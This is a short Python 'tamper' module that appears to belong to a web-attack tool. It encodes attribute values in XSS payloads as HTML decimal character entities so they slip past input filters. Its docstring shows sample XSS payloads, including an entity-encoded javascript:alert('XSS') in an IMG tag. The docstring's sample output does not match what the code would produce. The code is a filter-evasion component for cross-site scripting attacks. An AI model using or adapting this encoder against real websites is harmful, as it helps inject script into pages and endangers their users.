# -*- coding: utf-8 -*
import re
from main_modules.settings import PRIORITY
__priority__ = PRIORITY.HIGHEST



def tamper(payload, **kwargs):
    """
   

    >>> tamper("<script src=# onerror=alert(1)>")
    <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
    <IMG SRC="/" onerror=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
    """
    result=[]
    string=re.sub(r"(?<=[=:])[\S]*(?=[;<>\s/\\])",convert_this,str(payload))

    return (string) if payload else payload

def convert_this(string):
    new_word=[]
    string=string.group()
    for letter in string:
        new_word.append('&#'+str(ord(letter))+';')
    new_word=''.join(new_word)
    return new_word

